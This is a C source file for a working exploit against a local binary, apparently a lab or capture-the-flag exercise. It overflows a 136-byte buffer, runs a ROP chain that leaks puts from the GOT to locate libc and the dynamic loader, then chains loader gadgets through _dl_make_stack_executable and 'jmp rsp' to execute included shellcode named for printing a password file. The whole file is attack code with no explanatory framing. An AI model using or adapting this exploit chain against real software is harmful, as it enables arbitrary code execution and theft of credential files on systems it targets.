#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/mman.h>
#include <stdio.h>
#include <sys/wait.h>
#include "utils.h"
#include "shellcode.h"

#define WRITE_PIPE writePipe[1]
#define READ_PIPE readPipe[0]

#define LIBC(address) (libcAdress + address)
#define LD(address) (ldAddress + address)

unsigned long libcAddress = 0;
unsigned long ldAddress = 0;
unsigned long StackProtAddress = 0;

const int PUTS_OFFSET = 0x75DE0;

int main(void)
{
    pid_t child;
    signal(SIGCHLD, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);

    char *const argv[] = {"/home/loona/Documents/a.out", NULL};
    int readPipe[2];
    int writePipe[2];
    char buff[400];

    pipe(readPipe);
    pipe(writePipe);

    if (!(child = fork())) {
        dup2(writePipe[0], STDIN_FILENO);
        dup2(readPipe[1], STDOUT_FILENO);
        close(writePipe[1]);
        close(readPipe[0]);
        execv(argv[0], argv);
    }

    memset(buff, 'A', 136);

    unsigned long *rop = (unsigned long *) (buff + 136);
    *rop ++= 0x0040120b; // pop rdi
    *rop ++= 0x00404018; // got address got()
    *rop ++= 0x00401030; // puts@plt
    *rop ++= 0x00401146; // address start_levl

    sendStr(WRITE_PIPE, buff, (char*)rop - buff);
    waitAndReadCountChar(READ_PIPE, 57);

    unsigned long address = waitAndReadAdress(READ_PIPE);
    libcAddress = address - PUTS_OFFSET;
    ldAddress = libcAddress + 0x1E5000;
    StackProtAddress = ldAddress + 0x30090;


    printf("%p \n", libcAddress);
    printf("%p \n", ldAddress);
    printf("%p \n", StackProtAddress);
    printf("%p \n", libcAddress + 0xC9058);

    rop = (unsigned long *) (buff + 136);
    *rop ++= LD(0x00001d28); //pop rsi ; ret  ;
    *rop ++= 0x00404048; //BSS

    *rop ++= LD(0x000011ce);//0x000011ca pop rax ; pop rdx ; pop rbx ; ret  ;  (1 found)
    *rop ++= LD(0x00030E40) - 0x08; //stack end ;
    *rop ++= 7;
    *rop ++= 7;

    *rop ++= LD(0x00019150); //0x00019150 mov rax, qword [rax+0x08] ; ret  ;  (1 found)
    *rop ++= LD(0x00012c81); //0x00012c5f mov qword [rsi], rax ; ret  ;  (1 found)

    *rop ++= LD(0x00001d28); //pop rsi ; ret  ;
    *rop ++= 0x1000;

    *rop ++= LD(0x0000118d); //pop rdi ; ret  ;
    *rop ++= 0x00404048; //BSS
    *rop ++= LD(0x0001375d); //_dl_make_stack_exutable;
    *rop ++= LD(0x00001095); //jmp rsp;
    memcpy(rop, shellcodePrintPaswwd, strlen(shellcodePrintPaswwd));

    sendStr(WRITE_PIPE, buff, (char*)rop - buff + strlen(shellcodePrintPaswwd));
    waitpid(child, NULL, 0);
    readAllAndPrintLine(READ_PIPE);
}
